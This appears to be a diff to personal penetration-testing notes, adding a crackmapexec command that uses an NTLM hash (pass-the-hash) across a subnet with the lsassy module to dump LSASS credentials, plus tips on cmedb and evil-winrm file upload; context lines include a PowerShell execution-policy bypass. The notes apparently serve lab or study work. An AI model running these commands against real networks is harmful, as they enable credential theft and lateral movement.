@@ -387,3 +387,19 @@ Powershell Manual Service enum
 powershell -ep bypass
 What powershell -c command could we run to manually find out the service name? 
         powershell -c Get-Service
+
+####################
+crackmapexec inspection lssas dump
+####################
+crackmapexec smb 10.10.10.10/24 -u <username> -H <NTLM HASH FULL> --local-auth -M lsassy
+
+find crackmapexec DB:
+    cmedb
+    >help
+
+##################
+evil winrm 
+##################
+To upload file instead of certutil 
+
+WE CAN USE 'upload'
